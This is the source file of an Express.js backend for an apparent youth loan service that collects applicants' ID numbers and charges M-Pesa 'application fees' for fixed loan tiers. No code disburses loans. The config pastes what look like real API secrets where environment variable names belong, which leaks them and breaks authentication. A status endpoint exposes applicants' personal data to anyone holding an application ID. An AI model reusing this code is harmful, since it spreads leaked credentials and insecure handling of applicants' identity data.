require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Store applications in memory (in production, use a database)
const applications = new Map();

// M-Pesa Daraja API Configuration
const MPESA_CONFIG = {
    consumerKey: process.env.b3Kh7Pdfawi0N90pLqMeSCHJB3LDMpOhligAeCC8ezqd5nKI,
    consumerSecret: process.env.HGzGeTMY1zD3RhjJpANQIov9F7X4yUHOR1YmG2l9AfkTYfmnQwDFXk4qIwNpou94,
    shortCode: process.env.MPESA_SHORTCODE,
    passkey: process.env.MPESA_PASSKEY,
    callbackURL: process.env.MPESA_CALLBACK_URL || 'https://your-domain.com/callback'
};

// Get M-Pesa Access Token
async function getAccessToken() {
    try {
        const auth = Buffer.from(`${MPESA_CONFIG.consumerKey}:${MPESA_CONFIG.consumerSecret}`).toString('base64');
        
        const response = await axios.get(
            'https://sandbox.safaricom.co.ke/oauth/v1/generate?grant_type=client_credentials',
            {
                headers: {
                    Authorization: `Basic ${auth}`
                }
            }
        );
        
        return response.data.access_token;
    } catch (error) {
        console.error('Error getting access token:', error.message);
        throw error;
    }
}

// Initiate STK Push (M-Pesa Payment)
app.post('/api/initiate-payment', async (req, res) => {
    try {
        const { phoneNumber, amount, accountReference, transactionDesc } = req.body;
        
        // Remove leading 0 and add country code
        const formattedPhone = phoneNumber.startsWith('0') ? 
            `254${phoneNumber.substring(1)}` : phoneNumber;
        
        const accessToken = await getAccessToken();
        
        // Generate timestamp
        const timestamp = new Date().toISOString().replace(/[^0-9]/g, '').slice(0, -3);
        
        // Generate password
        const password = Buffer.from(
            `${MPESA_CONFIG.shortCode}${MPESA_CONFIG.passkey}${timestamp}`
        ).toString('base64');
        
        const paymentData = {
            BusinessShortCode: MPESA_CONFIG.shortCode,
            Password: password,
            Timestamp: timestamp,
            TransactionType: "CustomerPayBillOnline",
            Amount: amount,
            PartyA: formattedPhone,
            PartyB: MPESA_CONFIG.shortCode,
            PhoneNumber: formattedPhone,
            CallBackURL: MPESA_CONFIG.callbackURL,
            AccountReference: accountReference || 'NYOTA Loan',
            TransactionDesc: transactionDesc || 'Loan Application Fee'
        };
        
        const response = await axios.post(
            'https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest',
            paymentData,
            {
                headers: {
                    Authorization: `Bearer ${accessToken}`,
                    'Content-Type': 'application/json'
                }
            }
        );
        
        // Store transaction for reference
        applications.set(response.data.CheckoutRequestID, {
            phoneNumber,
            amount,
            status: 'pending',
            timestamp: new Date().toISOString()
        });
        
        res.json({
            success: true,
            message: 'Payment initiated successfully',
            data: response.data
        });
        
    } catch (error) {
        console.error('Payment initiation error:', error.message);
        res.status(500).json({
            success: false,
            message: 'Failed to initiate payment',
            error: error.message
        });
    }
});

// M-Pesa Callback Endpoint
app.post('/api/mpesa-callback', (req, res) => {
    const callbackData = req.body;
    
    console.log('M-Pesa Callback Received:', callbackData);
    
    // Process the callback
    if (callbackData.Body.stkCallback.ResultCode === 0) {
        // Payment successful
        const checkoutRequestID = callbackData.Body.stkCallback.CheckoutRequestID;
        
        if (applications.has(checkoutRequestID)) {
            const application = applications.get(checkoutRequestID);
            application.status = 'completed';
            application.completedAt = new Date().toISOString();
            
            // Here you would update your database with successful payment
            console.log('Payment completed for:', application);
        }
    } else {
        // Payment failed
        console.log('Payment failed:', callbackData.Body.stkCallback.ResultDesc);
    }
    
    res.json({ ResultCode: 0, ResultDesc: "Success" });
});

// Submit Loan Application
app.post('/api/submit-application', (req, res) => {
    try {
        const applicationData = req.body;
        
        // Validate application data
        if (!applicationData.fullName || !applicationData.phoneNumber || !applicationData.idNumber) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields'
            });
        }
        
        // Generate application ID
        const applicationId = 'NYOTA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        
        // Store application
        applications.set(applicationId, {
            ...applicationData,
            applicationId,
            status: 'pending',
            submittedAt: new Date().toISOString()
        });
        
        res.json({
            success: true,
            message: 'Application submitted successfully',
            applicationId,
            data: applicationData
        });
        
    } catch (error) {
        console.error('Application submission error:', error.message);
        res.status(500).json({
            success: false,
            message: 'Failed to submit application',
            error: error.message
        });
    }
});

// Get Application Status
app.get('/api/application/:id', (req, res) => {
    const applicationId = req.params.id;
    
    if (applications.has(applicationId)) {
        const application = applications.get(applicationId);
        
        res.json({
            success: true,
            data: application
        });
    } else {
        res.status(404).json({
            success: false,
            message: 'Application not found'
        });
    }
});

// Get Loan Options
app.get('/api/loan-options', (req, res) => {
    const loanOptions = [
        { amount: 5500, fee: 100 },
        { amount: 6800, fee: 130 },
        { amount: 7800, fee: 170 },
        { amount: 9800, fee: 190 },
        { amount: 11200, fee: 230 },
        { amount: 16800, fee: 250 },
        { amount: 21200, fee: 270 },
        { amount: 25600, fee: 400 },
        { amount: 30000, fee: 470 },
        { amount: 35400, fee: 590 },
        { amount: 39800, fee: 730 },
        { amount: 44200, fee: 1010 },
        { amount: 48600, fee: 1600 },
        { amount: 60600, fee: 2050 }
    ];
    
    res.json({
        success: true,
        data: loanOptions
    });
});

// Health Check
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        service: 'Nyota Youth Empowerment API'
    });
});

// Start Server
app.listen(PORT, () => {
    console.log(`Nyota Backend Server running on port ${PORT}`);
    console.log(`Health check: http://localhost:${PORT}/health`);
});
